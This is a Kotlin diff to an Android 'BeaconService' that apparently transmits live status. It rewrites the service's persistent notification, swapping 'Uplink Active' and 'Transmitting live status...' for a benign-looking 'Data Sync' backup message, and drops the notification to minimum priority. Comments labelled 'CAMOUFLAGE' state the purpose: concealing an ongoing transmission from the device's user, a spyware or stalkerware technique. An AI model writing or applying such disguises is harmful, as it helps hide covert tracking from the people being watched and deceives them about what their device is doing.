@@ -50,16 +50,19 @@ class BeaconService : Service() {
     }
 
     private fun createNotification(): Notification {
-        val channelId = "beacon_channel"
+        val channelId = "sync_service" // Changed ID
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-            val chan = NotificationChannel(channelId, "Live Connection", NotificationManager.IMPORTANCE_LOW)
+            // CAMOUFLAGE: Channel name
+            val chan = NotificationChannel(channelId, "Data Sync", NotificationManager.IMPORTANCE_MIN)
             getSystemService(NotificationManager::class.java).createNotificationChannel(chan)
         }
         return NotificationCompat.Builder(this, channelId)
-            .setContentTitle("Uplink Active")
-            .setContentText("Transmitting live status...")
+            // CAMOUFLAGE: Notification text
+            .setContentTitle("Synchronizing data")
+            .setContentText("Backing up usage statistics...")
             .setSmallIcon(android.R.drawable.stat_sys_upload)
             .setOngoing(true)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .build()
     }
 
